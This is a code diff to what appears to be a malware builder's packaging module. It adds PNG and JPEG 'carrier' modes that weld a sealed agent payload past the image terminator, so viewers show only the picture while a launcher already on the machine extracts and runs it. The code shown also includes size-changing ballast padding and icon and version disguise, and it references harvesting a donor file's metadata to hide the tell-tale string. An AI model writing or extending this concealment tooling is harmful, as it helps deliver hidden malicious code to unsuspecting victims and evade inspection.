@@ -13,11 +13,15 @@ Five things are owned here and nowhere else:
    the sealed blob and the footer, and one launcher opens any artifact.
 3. The container. ``[ stub ][ ballast ][ sealed ][ trailer 868 ][ footer 12 ]``, with
    the footer last so ``agent/loader.py`` finds the sealed blob with one seek.
-4. The two output modes. ``exe`` is the shipping artifact: a frozen launcher with the
+4. The output modes. ``exe`` is the shipping artifact: a frozen launcher with the
    sealed payload welded behind it. ``py`` is the inspectable one: a single runnable
    script carrying the sealed blob as base64, for a machine with an interpreter and
-   no frozen launcher. Both run the same ``agent.entry`` and both carry the same key;
-   the script mode just spells it out in text instead of hiding it in a binary.
+   no frozen launcher. ``dir`` is the one-directory shape: a launcher tree whose exe
+   is welded the same way. ``png`` and ``jpg`` are the carrier modes: the identical
+   tail welded onto an image, which a launcher that is already on the machine opens by
+   path. Every one of them runs the same ``agent.entry`` and every container carries the
+   same key; only the head differs, and the head is the only part the arithmetic
+   afterwards never touches.
 5. The icon. Two build inputs arrive here that are not part of the config: an ``.ico``
    patched into the launcher's resources on the copy being written, and one file welded
    into the payload archive under ``fused/``. Neither belongs in ``cfg.json`` â€” the
@@ -51,7 +55,7 @@ from typing import Final, Literal
 from .schema import MAX_BALLAST_MB, VERSION_FIELDS, RunConfig, VersionConfig, to_dict
 from .seal import MIN_SEALED_BYTES
 
-OutputMode = Literal["exe", "py", "dir"]
+OutputMode = Literal["exe", "py", "dir", "png", "jpg"]
 
 OUTPUT_EXE: Final[str] = "exe"
 OUTPUT_PY: Final[str] = "py"
@@ -59,7 +63,29 @@ OUTPUT_PY: Final[str] = "py"
 # trailer and the same seal; the interpreter sits beside it in ``_internal`` and is
 # never extracted at run time.
 OUTPUT_DIR: Final[str] = "dir"
-OUTPUT_MODES: Final[tuple[str, ...]] = (OUTPUT_EXE, OUTPUT_PY, OUTPUT_DIR)
+# Carrier output: the tail welded onto an image instead of onto a launcher. Both formats
+# end with a terminator the decoder stops at — PNG's ``IEND`` chunk and JPEG's ``FFD9``
+# marker — so bytes appended past it are invisible to every viewer and still readable by
+# arithmetic from the end of the file. The container is byte-for-byte the exe container
+# with an image where the launcher would be, which is what lets a launcher that is
+# already on the machine open a payload that arrived as a picture.
+OUTPUT_PNG: Final[str] = "png"
+OUTPUT_JPG: Final[str] = "jpg"
+OUTPUT_MODES: Final[tuple[str, ...]] = (
+    OUTPUT_EXE,
+    OUTPUT_PY,
+    OUTPUT_DIR,
+    OUTPUT_PNG,
+    OUTPUT_JPG,
+)
+
+# Modes whose output is a container: head, ballast, sealed blob, trailer, footer.
+WELDED_MODES: Final[tuple[str, ...]] = (OUTPUT_EXE, OUTPUT_DIR, OUTPUT_PNG, OUTPUT_JPG)
+CARRIER_MODES: Final[tuple[str, ...]] = (OUTPUT_PNG, OUTPUT_JPG)
+# Only these two have a PE resource table to patch. ``dir`` is a launcher tree, so its exe
+# takes the same icon and version as ``exe`` does; the script and carrier modes have no
+# table at all.
+RESOURCE_MODES: Final[tuple[str, ...]] = (OUTPUT_EXE, OUTPUT_DIR)
 
 # The container's tail, from the last byte backwards:
 #
@@ -96,7 +122,13 @@ CONFIG_MEMBER: Final[str] = "cfg.json"
 _MIB: Final[int] = 1024 * 1024
 _COPY_CHUNK: Final[int] = 1024 * 1024
 _OFFSET_BYTES: Final[int] = 8
-_EXTENSIONS: Final[dict[str, str]] = {OUTPUT_EXE: ".exe", OUTPUT_PY: ".py", OUTPUT_DIR: ""}
+_EXTENSIONS: Final[dict[str, str]] = {
+    OUTPUT_EXE: ".exe",
+    OUTPUT_PY: ".py",
+    OUTPUT_DIR: "",
+    OUTPUT_PNG: ".png",
+    OUTPUT_JPG: ".jpg",
+}
 
 # Fixed timestamp on every member so two builds of the same tree produce the same
 # payload bytes. The seal is randomised per artifact, so this only makes the zip
@@ -250,6 +282,149 @@ def image_end(data: bytes) -> int:
     if end <= 0 or end > len(data):
         raise ForgeError(f"stub image ends at {end}, past its {len(data)} bytes")
     return end
+
+
+# --- the carrier --------------------------------------------------------------
+
+# Where an image's own format stops. Both formats terminate explicitly and both decoders
+# stop reading at the terminator, which is the property the whole mode rests on: bytes
+# welded past it are invisible to every viewer and still addressable by arithmetic from the
+# end of the file.
+#
+# The check is ``carrier_end(data) == len(data)``, not "does it start like a PNG". A carrier
+# that already carries a tail is a build of a build: the footer would point at the new blob,
+# the old one would sit behind it, and the file would stop being an image the moment anyone
+# compared its size to its own terminator. One stat and one walk refuses that, and it also
+# refuses the renamed-executable case that the double-extension unit deliberately allows
+# elsewhere — a ``.png`` that is a PE is not a carrier.
+#
+# The ceiling is the build machine's memory: the whole carrier is read to be walked. A
+# screenshot is single-digit megabytes and a 4K wallpaper is twenty; anything past this is
+# not being delivered as a picture.
+MAX_CARRIER_BYTES: Final[int] = 64 * 1024 * 1024
+
+_PNG_SIGNATURE: Final[bytes] = b"\x89PNG\r\n\x1a\n"
+_PNG_IEND: Final[bytes] = b"IEND"
+# Every PNG chunk is four length bytes, four type bytes, the body, four CRC bytes. A file
+# of zero-length chunks is 12 bytes each, so this ceiling is a sanity bound on a walk that
+# is otherwise bounded by the file's own length anyway.
+_PNG_MAX_CHUNKS: Final[int] = 1_000_000
+
+_JPEG_SOI: Final[bytes] = b"\xff\xd8"
+_JPEG_EOI: Final[int] = 0xD9
+_JPEG_SOS: Final[int] = 0xDA
+# Markers with no length field: TEM and the eight restart markers.
+_JPEG_STANDALONE: Final[frozenset[int]] = frozenset(
+    {0x01, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7}
+)
+
+
+def _png_end(data: bytes) -> int:
+    """The offset just past the ``IEND`` chunk, or ``ForgeError``."""
+    if not data.startswith(_PNG_SIGNATURE):
+        raise ForgeError("carrier does not start with the PNG signature")
+
+    cursor = len(_PNG_SIGNATURE)
+    for _ in range(_PNG_MAX_CHUNKS):
+        if cursor + 8 > len(data):
+            raise ForgeError("carrier is a truncated PNG: no IEND chunk")
+        length = int.from_bytes(data[cursor:cursor + 4], "big")
+        kind = data[cursor + 4:cursor + 8]
+        # The length is read from the file, so it is checked before it is added to a
+        # cursor: an overstated chunk length is a refused read, not a seek past the end.
+        end = cursor + 12 + length
+        if end > len(data):
+            raise ForgeError(f"carrier PNG chunk {kind!r} runs past the file")
+        if kind == _PNG_IEND:
+            return end
+        cursor = end
+    raise ForgeError("carrier PNG has more chunks than a decoder would read")
+
+
+def _jpeg_end(data: bytes) -> int:
+    """The offset just past the ``EOI`` marker, or ``ForgeError``.
+
+    A segment walk rather than a search for the last ``FFD9``: a thumbnail in an EXIF block
+    is a complete JPEG with its own ``EOI``, so the last one in the file is not necessarily
+    the end of the picture. The walk follows the structure the format actually has.
+    """
+    if not data.startswith(_JPEG_SOI):
+        raise ForgeError("carrier does not start with the JPEG start-of-image marker")
+
+    cursor = len(_JPEG_SOI)
+    while cursor < len(data):
+        if data[cursor] != 0xFF:
+            raise ForgeError(f"carrier JPEG has no marker at offset {cursor}")
+        # Any number of 0xFF bytes may pad a marker; the first non-0xFF byte is the code.
+        while cursor < len(data) and data[cursor] == 0xFF:
+            cursor += 1
+        if cursor >= len(data):
+            raise ForgeError("carrier JPEG ends inside a marker")
+        code = data[cursor]
+        cursor += 1
+
+        if code == _JPEG_EOI:
+            return cursor
+        if code in _JPEG_STANDALONE:
+            continue
+        if cursor + 2 > len(data):
+            raise ForgeError("carrier JPEG segment runs past the file")
+
+        length = int.from_bytes(data[cursor:cursor + 2], "big")
+        if length < 2 or cursor + length > len(data):
+            raise ForgeError(f"carrier JPEG segment 0xFF{code:02X} runs past the file")
+        cursor += length
+
+        if code == _JPEG_SOS:
+            # Entropy-coded data follows: everything is literal until an 0xFF that is not
+            # a stuffed 0x00 and not a restart marker. That is what makes a marker scan
+            # inside a scan legal to do by hand.
+            while cursor < len(data):
+                if data[cursor] != 0xFF:
+                    cursor += 1
+                    continue
+                if cursor + 1 >= len(data):
+                    raise ForgeError("carrier JPEG ends inside entropy-coded data")
+                following = data[cursor + 1]
+                if following == 0x00 or 0xD0 <= following <= 0xD7:
+                    cursor += 2
+                    continue
+                break
+    raise ForgeError("carrier JPEG ends without an end-of-image marker")
+
+
+def carrier_end(data: bytes, name: str = "carrier") -> int:
+    """Where the image ends. Dispatched on the signature, never on the file name."""
+    if data.startswith(_PNG_SIGNATURE):
+        return _png_end(data)
+    if data.startswith(_JPEG_SOI):
+        return _jpeg_end(data)
+    raise ForgeError(f"{name}: not a PNG or a JPEG")
+
+
+def carrier_size(carrier: Path) -> int:
+    """The carrier's own byte length, after proving it has no tail of its own."""
+    try:
+        size = carrier.stat().st_size
+    except OSError as exc:
+        raise ForgeError(f"{carrier}: cannot stat ({exc.strerror})") from exc
+    if size <= 0:
+        raise ForgeError(f"{carrier}: is empty")
+    if size > MAX_CARRIER_BYTES:
+        raise ForgeError(f"{carrier}: {size} bytes, the ceiling is {MAX_CARRIER_BYTES}")
+
+    try:
+        data = carrier.read_bytes()
+    except OSError as exc:
+        raise ForgeError(f"{carrier}: cannot read ({exc.strerror})") from exc
+
+    end = carrier_end(data, carrier.name)
+    if end != size:
+        raise ForgeError(
+            f"{carrier}: {size - end} bytes past the end of the image; "
+            f"that is already a container, not a carrier"
+        )
+    return size
 
 
 # --- the resource table -------------------------------------------------------
@@ -1149,24 +1324,29 @@ def _write_ballast(handle: object, megabytes: int) -> None:
         remaining -= chunk
 
 
-def _write_exe(
-    destination: Path, stub: Path, sealed: bytes, ballast_mb: int, cfg: RunConfig
+def _write_welded(
+    destination: Path,
+    head: Path,
+    head_size: int,
+    sealed: bytes,
+    ballast_mb: int,
+    cfg: RunConfig,
 ) -> Path:
-    try:
-        stub_size = stub.stat().st_size
-    except OSError as exc:
-        raise ForgeError(f"{stub}: cannot stat ({exc.strerror})") from exc
-    if stub_size <= 0:
-        raise ForgeError(f"{stub}: stub is empty")
+    """``[ head ][ ballast ][ sealed ][ trailer ][ footer ]``, whatever the head is.
 
-    offset = expected_offset(stub_size, ballast_mb)
+    One writer for every container mode. The head is a launcher image for ``exe`` and
+    ``dir``, a PNG or a JPEG for the carrier modes — the arithmetic afterwards does not
+    know the difference, which is exactly why a launcher that is already on the machine
+    can open a payload that arrived as a picture.
+    """
+    offset = expected_offset(head_size, ballast_mb)
     block = trailer(cfg)
     staging = destination.with_name(destination.name + ".part")
 
     try:
         destination.parent.mkdir(parents=True, exist_ok=True)
         with staging.open("wb") as handle:
-            with stub.open("rb") as source:
+            with head.open("rb") as source:
                 shutil.copyfileobj(source, handle, _COPY_CHUNK)
             _write_ballast(handle, ballast_mb)
             handle.write(sealed)
@@ -1183,6 +1363,27 @@ def _write_exe(
         raise ForgeError(f"{destination}: cannot write ({exc.strerror})") from exc
 
     return destination
+
+
+def _write_exe(
+    destination: Path, stub: Path, sealed: bytes, ballast_mb: int, cfg: RunConfig
+) -> Path:
+    try:
+        stub_size = stub.stat().st_size
+    except OSError as exc:
+        raise ForgeError(f"{stub}: cannot stat ({exc.strerror})") from exc
+    if stub_size <= 0:
+        raise ForgeError(f"{stub}: stub is empty")
+
+    return _write_welded(destination, stub, stub_size, sealed, ballast_mb, cfg)
+
+
+def _write_carrier(
+    destination: Path, carrier: Path, sealed: bytes, ballast_mb: int, cfg: RunConfig
+) -> Path:
+    """The same container with an image where the launcher would be."""
+    size = carrier_size(carrier)
+    return _write_welded(destination, carrier, size, sealed, ballast_mb, cfg)
 
 
 def _write_tree(
@@ -1379,6 +1580,7 @@ def build(
     icon: Path | None = None,
     version: VersionConfig | None = None,
     donor: Path | None = None,
+    carrier: Path | None = None,
 ) -> Path:
     """Write the finished artifact. Returns ``destination``.
 
@@ -1387,6 +1589,10 @@ def build(
     over the donor's version field. That order is what makes the donor useful against a
     form that is half-filled — the operator takes the file apart and then corrects the
     one string that would give it away.
+
+    ``carrier`` is the image the tail is welded onto for the two image modes. It is a build
+    input the same way ``stub`` is: a file on this machine, validated before it is copied,
+    never a field in ``cfg.json``.
     """
     if mode not in OUTPUT_MODES:
         raise ForgeError(f"{mode!r}: expected one of {', '.join(OUTPUT_MODES)}")
@@ -1397,9 +1603,19 @@ def build(
     if expected and destination.suffix.lower() != expected:
         raise ForgeError(f"{destination.name}: {mode} output must end {expected}")
 
-    if mode in (OUTPUT_EXE, OUTPUT_DIR):
+    if mode in CARRIER_MODES:
+        if carrier is None:
+            raise ForgeError(f"{mode} output needs a carrier image")
+        # An image has no resource table, so the disguise fields are the caller's mistake
+        # rather than a value this mode can honour. ``validate`` reports the same three as
+        # notes; the build does not fail over them for the reason ``py`` does not.
+        return _write_carrier(destination, carrier, sealed, _ballast(cfg.ballast_mb), cfg)
+
+    if mode in WELDED_MODES:
         if stub is None:
             raise ForgeError(f"{mode} output needs a frozen launcher")
+        if carrier is not None:
+            raise ForgeError(f"{mode} output takes a launcher, not a carrier")
         taken = harvest(donor) if donor is not None else None
         entries = icon_entries(icon) if icon is not None else None
         if entries is None and taken is not None and taken.icons:
@@ -1420,6 +1636,9 @@ def build(
         with _patched_stub(stub, icons=entries, version=settled) as patched:
             return _write_exe(destination, patched, sealed, ballast, cfg)
 
+    if carrier is not None:
+        raise ForgeError(f"{mode} output takes no carrier image")
+
     # Script output carries no ballast. The pad exists to change the size of a
     # binary; padding a text file with comment lines would only make the build
     # slower to read for the same number. Recorded in DECISIONS.md.
@@ -1428,26 +1647,34 @@ def build(
 
 __all__ = [
     "BOUND_SUFFIXES",
+    "CARRIER_MODES",
     "CONFIG_MEMBER",
     "FOOTER_SIZE",
     "FUSE_PREFIX",
     "KEY_SLOT",
+    "MAX_CARRIER_BYTES",
     "MAX_FUSE_BYTES",
     "MAX_ICON_BYTES",
     "MAX_VERSION_BYTES",
     "MUTEX_SLOT",
     "OUTPUT_DIR",
     "OUTPUT_EXE",
+    "OUTPUT_JPG",
     "OUTPUT_MODES",
+    "OUTPUT_PNG",
     "OUTPUT_PY",
+    "RESOURCE_MODES",
     "SCHEMA_MEMBER",
     "TRAILER_SIZE",
+    "WELDED_MODES",
     "Donor",
     "ForgeError",
     "IconEntry",
     "OutputMode",
     "ResourceRef",
     "build",
+    "carrier_end",
+    "carrier_size",
     "expected_offset",
     "group_payload",
     "harvest",
